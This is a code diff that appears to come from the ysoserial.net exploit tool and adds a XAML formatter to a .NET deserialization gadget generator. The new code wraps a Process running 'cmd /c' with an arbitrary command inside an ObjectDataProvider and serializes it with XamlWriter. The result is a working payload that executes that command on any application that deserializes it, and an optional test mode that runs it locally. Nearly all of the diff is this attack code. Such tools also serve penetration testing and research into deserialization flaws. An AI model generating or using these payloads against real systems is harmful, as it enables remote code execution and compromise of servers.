@@ -8,6 +8,11 @@ using System.Web.Script.Serialization;
 using System.Xml;
 using System.Xml.Serialization;
 using YamlDotNet.Serialization;
+using System.Windows.Markup;
+using System.Diagnostics;
+using System.Windows.Data;
+using System.Reflection;
+using System.Collections.Specialized;
 
 namespace ysoserial.Generators
 {
@@ -20,7 +25,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "YamlDotNet < 5.0.0" };
+            return new List<string> { "Xaml", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "YamlDotNet < 5.0.0" };
         }
 
         public override string Name()
@@ -30,6 +35,36 @@ namespace ysoserial.Generators
 
         public override object Generate(string cmd, string formatter, Boolean test)
         {
+            if (formatter.ToLower().Equals("xaml"))
+            {
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.FileName = "cmd";
+                psi.Arguments = "/c " + cmd;
+                StringDictionary dict = new StringDictionary();
+                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
+                Process p = new Process();
+                p.StartInfo = psi;
+                ObjectDataProvider odp = new ObjectDataProvider();
+                odp.MethodName = "Start";
+                odp.IsInitialLoadEnabled = false;
+                odp.ObjectInstance = p;
+
+                string payload  = XamlWriter.Save(odp);
+
+                if (test)
+                {
+                    try
+                    {
+                        StringReader stringReader = new StringReader(payload);
+                        XmlReader xmlReader = XmlReader.Create(stringReader);
+                        XamlReader.Load(xmlReader);
+                    }
+                    catch
+                    {
+                    }
+                }
+                return payload;
+            }
             if (formatter.ToLower().Equals("json.net"))
             {
                 String payload = @"{
